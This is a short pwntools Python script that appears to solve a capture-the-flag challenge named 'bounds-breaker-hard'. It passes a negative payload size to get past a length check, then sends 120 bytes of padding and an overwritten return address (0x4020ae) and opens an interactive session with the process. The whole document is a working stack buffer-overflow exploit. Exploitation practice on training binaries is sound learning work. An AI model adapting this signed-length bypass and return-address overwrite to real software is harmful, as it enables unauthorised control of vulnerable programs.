from pwn import *

p = process('/challenge/bounds-breaker-hard')

p.recvuntil('Payload size: ')

p.sendline(b'-50')
payload = b'a' * 120 + p64(0x4020ae)

p.recvuntil('Send your payload')
p.sendline(payload)

p.interactive()
